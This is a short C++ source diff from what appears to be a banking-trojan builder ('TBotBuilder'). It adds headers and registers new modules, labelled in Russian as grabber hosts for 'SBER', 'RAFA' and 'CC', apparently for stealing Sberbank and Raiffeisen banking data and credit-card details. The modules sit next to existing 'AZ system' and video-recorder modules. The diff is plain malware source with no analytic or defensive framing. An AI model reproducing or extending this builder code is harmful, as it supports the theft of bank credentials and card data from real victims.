@@ -15,6 +15,9 @@
 #include "VideoRecorder.h"
 #include "FgrFilters.h"
 #include "AzConfig.h"
+#include "Sber.h"
+#include "Rafa.h"
+#include "cc.h"
 
 //---------------------------------------------------------------------------
 
@@ -607,6 +610,17 @@ void __fastcall TBotBuilder::InitializeModules()
 	Module = AddModule(Module_AzConfig);
 	Module->AddParam(false, AZCONFIG_PARAM_ENCRYPTED_HOSTS, AZCONFIG_PARAM_NAME_HOSTS, AZCONFIG_PARAM_SIZE_HOSTS, "Хосты системы AZ");
 	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS, AZCONFIG_PARAM_NAME_SCRIPTHOSTS, AZCONFIG_PARAM_SIZE_SCRIPTHOSTS, "Хосты Java скриптов системы AZ");
+
+	// Настройки грабера сбер
+	Module = AddModule(Module_SberHosts);
+	Module->AddParam(true, SBERHOSTS_PARAM_ENCRYPTED, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, "Хосты грабера SBER");
+
+
+	Module = AddModule(Module_RafaHosts);
+	Module->AddParam(true, RAFAHOSTS_PARAM_ENCRYPTED, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, "Хосты грабера RAFA");
+
+	Module = AddModule(Module_CCHosts);
+	Module->AddParam(true, CCHOSTS_PARAM_ENCRYPTED, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, "Хосты грабера CC");
 }
 
 
